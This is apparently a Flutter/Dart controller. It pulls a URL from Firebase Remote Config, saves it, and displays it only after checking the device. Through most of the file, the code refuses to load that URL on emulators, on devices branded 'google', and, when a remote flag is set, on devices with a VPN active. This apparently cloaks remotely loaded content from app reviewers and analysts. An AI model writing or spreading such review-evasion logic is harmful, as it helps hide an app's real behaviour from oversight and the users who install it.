import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';

class IndexController extends ChangeNotifier {
  bool hasInternetConnection = true;
  bool isLoading = true;
  String? url;

  void setUrl(String? link) {
    url = link;
    isLoading = false;
    notifyListeners();
  }

  void setHasInternetConnection(bool isActive) {
    hasInternetConnection = isActive;
    notifyListeners();
  }

  void configureUrl() async {
    final result = await Connectivity().checkConnectivity();
    if (result == ConnectivityResult.none) {
      setHasInternetConnection(false);
      return;
    } else if (result == ConnectivityResult.wifi || result == ConnectivityResult.mobile) {
      setHasInternetConnection(true);
      final localUrl = await Utils.getUrl();
      if (localUrl != null && localUrl.isNotEmpty) {
        setUrl(localUrl);
      } else {
        try {
          final remoteConfig = FirebaseRemoteConfig.instance;
          await remoteConfig.setConfigSettings(
            RemoteConfigSettings(
              fetchTimeout: const Duration(minutes: 1),
              minimumFetchInterval: const Duration(seconds: 1),
            ),
          );
          await remoteConfig.fetchAndActivate();
          final remoteUrl = remoteConfig.getString('url');
          final checkVpn = remoteConfig.getBool('to');
          checkVpn == true ? checkWithVpn(remoteUrl) : checkWithoutVpn(remoteUrl);
        } catch (e, stt) {
          debugPrint(e.toString() + stt.toString());
          isLoading = false;
        }
      }
    }
  }

  void checkWithVpn(String remoteUrl) async {
    if (remoteUrl.isNotEmpty &&
        !await Utils.isEmulator() &&
        !await CheckVpnConnection.isVpnActive()) {
      Utils.saveUrl(remoteUrl);
      setUrl(remoteUrl);
    } else {
      setUrl(null);
    }
  }

  void checkWithoutVpn(String remoteUrl) async {
    if (remoteUrl.isNotEmpty && !await Utils.isEmulator()) {
      Utils.saveUrl(remoteUrl);
      setUrl(remoteUrl);
    } else {
      setUrl(null);
    }
  }
}

class Utils {
  static const _urlPref = 'url';

  static Future<SharedPreferences> get _sp => SharedPreferences.getInstance();

  static Future<String?> getUrl() {
    return _sp.then((prefs) => prefs.getString(_urlPref));
  }

  static Future<void> saveUrl(String url) {
    return _sp.then((prefs) => prefs.setString(_urlPref, url));
  }

  static Future<bool> isEmulator() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    final em = await deviceInfo.androidInfo;
    final phoneModel = em.model;
    final buildProduct = em.product;
    final buildHardware = em.hardware;
    bool result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains("nox"));
    if (result) return true;
    result = result || (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
    return result;
  }
}
